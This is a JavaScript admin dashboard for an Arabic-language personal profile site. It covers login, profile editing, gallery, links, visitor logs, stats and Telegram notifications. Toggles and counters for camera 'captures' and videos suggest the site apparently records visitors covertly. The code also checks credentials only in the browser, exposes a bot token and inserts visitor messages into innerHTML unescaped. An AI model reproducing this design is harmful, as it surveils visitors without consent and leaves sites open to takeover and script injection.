(function(){
  const C = window.CONFIG;
  const $ = s => document.querySelector(s);
  const LS = {
    get(k,d){try{return JSON.parse(localStorage.getItem('tj_'+k))??d}catch{return d}},
    set(k,v){localStorage.setItem('tj_'+k,JSON.stringify(v))}
  };

  const DEFAULT = {
    owner: JSON.parse(JSON.stringify(C.OWNER)),
    theme: 'dark', gallery: [], avatar: '',
    maintenance: false, visits: 0, captures: 0, videos: 0,
    photoMode: true, videoMode: true, dropMode: true,
    visitors: [], messages: []
  };

  function getState(){
    let s = LS.get('state', null);
    if(s) return s;
    LS.set('state', DEFAULT);
    return JSON.parse(JSON.stringify(DEFAULT));
  }
  function saveState(s){ LS.set('state', s); }
  let state = getState();

  const sessionKey = 'admin_session';
  function isLoggedIn(){ return localStorage.getItem(sessionKey)==='yes'; }

  function tg(msg){
    fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendMessage',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:C.OWNER_ID, text:msg, parse_mode:'HTML'})
    }).catch(()=>{});
  }

  function showDash(){
    $('#login').style.display='none';
    $('#dash').style.display='block';
    $('#logoutBtn').style.display='inline-block';
    loadAll();
  }

  $('#loginBtn').addEventListener('click', ()=>{
    const u=$('#user').value.trim(), p=$('#pass').value;
    if(u===C.ADMIN_USER && p===C.ADMIN_PASS){
      localStorage.setItem(sessionKey,'yes');
      tg('🔐 <b>دخول المالك</b>\n⏰ '+new Date().toLocaleString('ar-EG'));
      showDash();
    } else {
      alert('بيانات غلط');
      tg('⚠️ محاولة دخول فاشلة: '+u);
    }
  });

  $('#logoutBtn').addEventListener('click', ()=>{
    localStorage.removeItem(sessionKey);
    location.href='/';
  });

  if(isLoggedIn()) showDash();

  document.querySelectorAll('.tab').forEach(t=>{
    t.addEventListener('click', ()=>{
      document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
      document.querySelectorAll('.panel').forEach(x=>x.classList.remove('active'));
      t.classList.add('active');
      $('#panel-'+t.dataset.tab).classList.add('active');
    });
  });

  function flash(t){
    const m=$('#msg');
    if(!m) return;
    m.textContent=t; m.style.display='block';
    setTimeout(()=>m.style.display='none', 2500);
  }

  function loadAll(){
    const o=state.owner;
    const ap=$('#avatarPreview');
    if(ap){ if(state.avatar){ap.src=state.avatar; ap.style.display='block';} else ap.style.display='none'; }
    $('#fSiteName').value = o.siteName||'طه';
    $('#fName').value = o.name||'';
    $('#fTitle').value = o.title||'';
    $('#fLoc').value = o.location||'';
    $('#fBirth').value = o.birthdate||'2008-01-19';
    $('#fQuote').value = o.quote||'';
    $('#fAbout').value = o.about||'';
    $('#fWA').value = o.whatsapp||'';
    $('#fFB').value = o.facebook||'';
    $('#fIG').value = o.instagram||'';
    renderFeatures(); renderGallery(); renderLinks(); renderVisitors(); renderMessages();
    $('#fTheme').value = state.theme||'dark';
    $('#camToggle').checked = state.photoMode!==false;
    $('#vidToggle').checked = state.videoMode!==false;
    $('#dropToggle').checked = state.dropMode!==false;
    refreshStats();
  }

  $('#saveSiteName').addEventListener('click', ()=>{
    state.owner.siteName = $('#fSiteName').value.trim() || 'طه';
    saveState(state); flash('✅ تم');
    tg('📝 اسم الموقع: '+state.owner.siteName);
  });

  $('#avatarFile').addEventListener('change', e=>{
    const f=e.target.files[0]; if(!f) return;
    const r=new FileReader();
    r.onload=ev=>{ state.avatar=ev.target.result; saveState(state);
      const ap=$('#avatarPreview'); if(ap){ap.src=state.avatar;ap.style.display='block'} flash('✅ تم'); };
    r.readAsDataURL(f);
  });
  $('#saveAvatar').addEventListener('click', ()=>{
    const url=$('#avatarUrl').value.trim();
    if(url){ state.avatar=url; saveState(state);
      const ap=$('#avatarPreview'); if(ap){ap.src=url;ap.style.display='block'} flash('✅ تم'); }
    else flash('✅ محفوظ');
  });
  $('#removeAvatar').addEventListener('click', ()=>{
    if(!confirm('حذف الصورة؟')) return;
    state.avatar=''; saveState(state);
    const ap=$('#avatarPreview'); if(ap) ap.style.display='none';
    flash('✅ تم');
  });

  $('#saveInfo').addEventListener('click', ()=>{
    Object.assign(state.owner, {
      name:$('#fName').value, title:$('#fTitle').value, location:$('#fLoc').value,
      birthdate:$('#fBirth').value, quote:$('#fQuote').value, about:$('#fAbout').value,
      whatsapp:$('#fWA').value, facebook:$('#fFB').value, instagram:$('#fIG').value
    });
    saveState(state); flash('✅ تم'); tg('✏️ تعديل البيانات');
  });

  function renderFeatures(){
    const el=$('#featuresList'); if(!el) return; el.innerHTML='';
    if(!state.owner.features) state.owner.features=[];
    state.owner.features.forEach((f,i)=>{
      const d=document.createElement('div'); d.className='item-row';
      d.innerHTML='<input value="'+(f.icon||'✨')+'" data-i="'+i+'" data-k="icon" style="width:50px;text-align:center"><input value="'+(f.name||'')+'" data-i="'+i+'" data-k="name" placeholder="الاسم" style="flex:1"><input value="'+(f.desc||'')+'" data-i="'+i+'" data-k="desc" placeholder="وصف" style="flex:2"><button data-del="'+i+'">✕</button>';
      el.appendChild(d);
    });
    el.querySelectorAll('input').forEach(inp=>inp.addEventListener('input', e=>{
      const i=+e.target.dataset.i; state.owner.features[i][e.target.dataset.k]=e.target.value;
    }));
    el.querySelectorAll('[data-del]').forEach(b=>b.addEventListener('click', ()=>{
      state.owner.features.splice(+b.dataset.del,1); saveState(state); renderFeatures();
    }));
  }
  $('#addFeature').addEventListener('click', ()=>{
    if(!state.owner.features) state.owner.features=[];
    state.owner.features.push({icon:'✨', name:'ميزة جديدة', desc:'وصف'});
    renderFeatures();
  });
  $('#saveFeatures').addEventListener('click', ()=>{saveState(state); flash('✅')});

  function renderGallery(){
    const el=$('#galleryList'); if(!el) return; el.innerHTML='';
    state.gallery.forEach((url,i)=>{
      const d=document.createElement('div'); d.className='item-row';
      d.innerHTML='<img src="'+url+'" style="width:45px;height:45px;object-fit:cover;border-radius:7px"><input value="'+(url.length>40?url.slice(0,40)+'...':url)+'" readonly><button data-del="'+i+'">✕</button>';
      d.querySelector('[data-del]').addEventListener('click', ()=>{
        state.gallery.splice(i,1); saveState(state); renderGallery();
      });
      el.appendChild(d);
    });
  }
  $('#addGallery').addEventListener('click', ()=>{
    const url=$('#galleryUrl').value.trim(), file=$('#galleryFile').files[0];
    if(file){
      const r=new FileReader();
      r.onload=e=>{state.gallery.push(e.target.result); saveState(state); renderGallery(); flash('✅')};
      r.readAsDataURL(file);
      $('#galleryFile').value=''; $('#galleryUrl').value='';
    } else if(url){ state.gallery.push(url); saveState(state); renderGallery(); flash('✅'); $('#galleryUrl').value=''; }
    else flash('❌ ضع رابط أو ارفع صورة');
  });

  function renderLinks(){
    const el=$('#linksList'); if(!el) return; el.innerHTML='';
    if(!state.owner.extraLinks) state.owner.extraLinks=[];
    state.owner.extraLinks.forEach((l,i)=>{
      const d=document.createElement('div'); d.className='item-row';
      d.innerHTML='<input value="'+(l.icon||'🔗')+'" data-i="'+i+'" data-k="icon" style="width:50px;text-align:center"><input value="'+(l.name||'')+'" data-i="'+i+'" data-k="name" placeholder="الاسم" style="flex:1"><input value="'+(l.url||'')+'" data-i="'+i+'" data-k="url" placeholder="https://..." style="flex:2"><button data-del="'+i+'">✕</button>';
      el.appendChild(d);
    });
    el.querySelectorAll('input').forEach(inp=>inp.addEventListener('input', e=>{
      const i=+e.target.dataset.i; state.owner.extraLinks[i][e.target.dataset.k]=e.target.value;
    }));
    el.querySelectorAll('[data-del]').forEach(b=>b.addEventListener('click', ()=>{
      state.owner.extraLinks.splice(+b.dataset.del,1); saveState(state); renderLinks();
    }));
  }
  $('#addLink').addEventListener('click', ()=>{
    if(!state.owner.extraLinks) state.owner.extraLinks=[];
    state.owner.extraLinks.push({icon:'🔗', name:'رابط جديد', url:'https://'});
    renderLinks();
  });
  $('#saveLinks').addEventListener('click', ()=>{saveState(state); flash('✅')});

  $('#saveTheme').addEventListener('click', ()=>{state.theme=$('#fTheme').value; saveState(state); flash('✅')});

  $('#saveCapture').addEventListener('click', ()=>{
    state.photoMode=$('#camToggle').checked;
    state.videoMode=$('#vidToggle').checked;
    state.dropMode=$('#dropToggle').checked;
    saveState(state); flash('✅');
  });

  function renderVisitors(){
    const el=$('#visitorsList'); if(!el) return;
    el.innerHTML='';
    const v = (state.visitors||[]).slice(-50).reverse();
    if(!v.length){ el.innerHTML='<p style="color:var(--muted);font-size:12px">لا يوجد زوار بعد</p>'; return; }
    v.forEach(x=>{
      const d=document.createElement('div'); d.className='visitor-row';
      const dt = new Date(x.t);
      d.innerHTML='<b>'+dt.toLocaleString('ar-EG')+'</b><br>'+ (x.plat||'—') +' — '+x.screen+' — '+x.lang+'<br><span style="color:var(--muted)">'+ (x.ua||'').slice(0,80) +'</span>';
      el.appendChild(d);
    });
  }

  function renderMessages(){
    const el=$('#messagesList'); if(!el) return;
    el.innerHTML='';
    const m = (state.messages||[]).slice().reverse();
    if(!m.length){ el.innerHTML='<p style="color:var(--muted);font-size:12px">لا توجد رسائل بعد</p>'; return; }
    m.forEach(x=>{
      const d=document.createElement('div'); d.className='msg-row';
      d.innerHTML='<b>'+x.name+'</b>'+(x.phone?' — '+x.phone:'')+'<br>'+x.msg+'<br><span style="color:var(--muted)">'+new Date(x.t).toLocaleString('ar-EG')+'</span>';
      el.appendChild(d);
    });
  }

  function refreshStats(){
    $('#sVisits').textContent = state.visits||0;
    $('#sCaptures').textContent = state.captures||0;
    $('#sVideos').textContent = state.videos||0;
    $('#sGallery').textContent = (state.gallery||[]).length;
    $('#sLinks').textContent = (state.owner.extraLinks||[]).length;
  }
  $('#refreshStats').addEventListener('click', refreshStats);

  $('#exportBtn').addEventListener('click', ()=>{
    const blob=new Blob([JSON.stringify(state,null,2)],{type:'application/json'});
    const a=document.createElement('a'); a.href=URL.createObjectURL(blob);
    a.download='backup-'+Date.now()+'.json'; a.click();
    flash('✅ تم');
  });
  $('#importFile').addEventListener('change', e=>{
    const f=e.target.files[0]; if(!f) return;
    const r=new FileReader();
    r.onload=ev=>{
      try{ state=JSON.parse(ev.target.result); saveState(state); loadAll(); flash('✅'); }
      catch{ alert('ملف غير صالح') }
    };
    r.readAsText(f);
  });
  $('#resetBtn').addEventListener('click', ()=>{
    if(!confirm('متأكد؟ كل التعديلات هتتمسح')) return;
    state=JSON.parse(JSON.stringify(DEFAULT)); saveState(state); loadAll(); flash('✅');
  });

})();
